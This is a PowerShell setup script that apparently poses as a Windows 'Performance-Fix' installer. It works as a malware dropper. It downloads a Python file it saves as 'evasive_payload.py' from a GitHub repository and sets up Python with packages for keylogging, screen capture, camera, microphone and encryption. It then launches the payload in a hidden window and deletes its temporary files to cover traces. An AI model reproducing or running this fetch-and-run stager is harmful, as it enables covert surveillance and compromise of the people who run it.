# setup.ps1
$ErrorActionPreference = "SilentlyContinue"
$tempDir = "$env:TEMP\py_install"
New-Item -ItemType Directory -Force -Path $tempDir | Out-Null

$payloadUrl = "https://raw.githubusercontent.com/fortnite0712102-dot/Performance-Fix/refs/heads/main/WindowsHelper.py"
$payloadPath = "$env:TEMP\evasive_payload.py"
Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing

$pythonZipUrl = "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip"
$pythonPath = "$env:TEMP\python_embed"
$pythonExe = "$pythonPath\python.exe"

if (-not (Get-Command python.exe -ErrorAction SilentlyContinue) -and -not (Test-Path $pythonExe)) {
    $zipPath = "$tempDir\python.zip"
    Invoke-WebRequest -Uri $pythonZipUrl -OutFile $zipPath -UseBasicParsing
    Expand-Archive -Path $zipPath -DestinationPath $pythonPath -Force
}
if (Test-Path $pythonExe) {
    $pythonCmd = $pythonExe
    $getPipUrl = "https://bootstrap.pypa.io/get-pip.py"
    $getPipPath = "$tempDir\get-pip.py"
    Invoke-WebRequest -Uri $getPipUrl -OutFile $getPipPath -UseBasicParsing
    & $pythonCmd $getPipPath --quiet
    $env:Path = "$pythonPath\Scripts;$env:Path"
} else {
    $pythonCmd = "python.exe"
}
$packages = @("cryptography", "pynput", "mss", "pillow", "psutil", "requests", "numpy", "opencv-python", "pyaudio", "pywin32")
foreach ($pkg in $packages) {
    & $pythonCmd -m pip install $pkg --quiet --disable-pip-version-check --no-warn-script-location --user
}
Start-Process -FilePath $pythonCmd -ArgumentList $payloadPath -WindowStyle Hidden
Start-Sleep -Seconds 10
Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path $pythonPath -Recurse -Force -ErrorAction SilentlyContinue